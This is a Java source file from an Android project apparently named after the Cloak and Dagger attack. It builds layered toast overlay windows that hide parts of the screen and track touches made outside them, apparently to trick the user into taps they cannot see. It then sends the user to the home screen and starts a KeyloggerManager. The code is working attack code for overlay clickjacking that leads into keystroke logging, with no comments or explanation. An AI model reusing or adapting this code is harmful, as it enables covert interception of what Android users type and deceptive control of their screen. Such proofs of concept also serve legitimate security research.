package com.konradkevin.cloakanddagger;

import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.view.Display;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;

class WindowSetup {
    private int type =  WindowManager.LayoutParams.TYPE_TOAST;
    private int flags = 0;
    private static WindowManager manager;
    private int width;
    private int height;
    private volatile View overlaying_view1;
    private volatile View overlaying_view2;
    private volatile View touch_view;

    WindowSetup(Context context) {
        manager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        Point size = new Point();
        Display display = null;

        if (manager != null) {
            display = manager.getDefaultDisplay();
        }

        if (display != null) {
            display.getSize(size);
        }

        width = size.x;
        height = size.y;
    }

    void bypassSetup(Context context) {
        new KeyloggerManager(context, manager, width);
    }

    void startToast(Context context) {
        final Context parent = context;
        manager = (WindowManager) parent.getSystemService(Context.WINDOW_SERVICE);
        View padding = View.inflate(parent, R.layout.padding_view, null);
        WindowManager.LayoutParams layoutParams_pad = new WindowManager.LayoutParams(width, height, type, flags | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT);
        layoutParams_pad.gravity = Gravity.FILL;
        manager.addView(padding, layoutParams_pad);

        overlaying_view1 = View.inflate(parent, R.layout.activity_obscuring_toast, null);
        WindowManager.LayoutParams layoutParams_obs1 = new WindowManager.LayoutParams(width, 340, type, flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, PixelFormat.TRANSLUCENT);
        layoutParams_obs1.gravity = Gravity.TOP;
        manager.addView(overlaying_view1, layoutParams_obs1);

        touch_view = View.inflate(parent, R.layout.touch_view, null);
        WindowManager.LayoutParams layoutParams_touch1 = new WindowManager.LayoutParams(width, height - height/3 + 195, type, flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, PixelFormat.TRANSLUCENT);
        touch_view.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                v.performClick();

                if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                    startPhase2(parent);
                    return true;
                }

                return false;
            }
        });

        layoutParams_touch1.gravity = Gravity.BOTTOM;
        manager.addView(touch_view, layoutParams_touch1);
    }

    private void startPhase2(Context context) {
        final Context parent = context;
        touch_view.setVisibility(View.GONE);

        overlaying_view2 = View.inflate(parent, R.layout.obscuring_toast2, null);
        WindowManager.LayoutParams layoutParams_obs2 = new WindowManager.LayoutParams(width, 425, type, flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, PixelFormat.TRANSLUCENT);
        layoutParams_obs2.gravity = Gravity.TOP;

        manager.addView(overlaying_view2, layoutParams_obs2);
        overlaying_view1.setVisibility(View.GONE);

        touch_view = View.inflate(parent, R.layout.touch_view, null);
        WindowManager.LayoutParams layoutParams_touch2 = new WindowManager.LayoutParams(width, height - height/3 + 110, type, flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, PixelFormat.TRANSLUCENT);
        touch_view.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                v.performClick();

                if(event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                    try {
                        Thread.sleep(250);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    overlaying_view1.setVisibility(View.GONE);
                    touch_view.setVisibility(View.GONE);
                    overlaying_view2.setVisibility(View.GONE);

                    Intent startMain = new Intent(Intent.ACTION_MAIN);
                    startMain.addCategory(Intent.CATEGORY_HOME);
                    startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    parent.startActivity(startMain);

                    new KeyloggerManager(parent, manager, width);
                    return true;
                }
                return false;
            }
        });

        layoutParams_touch2.gravity = Gravity.BOTTOM;
        manager.addView(touch_view, layoutParams_touch2);
    }
}
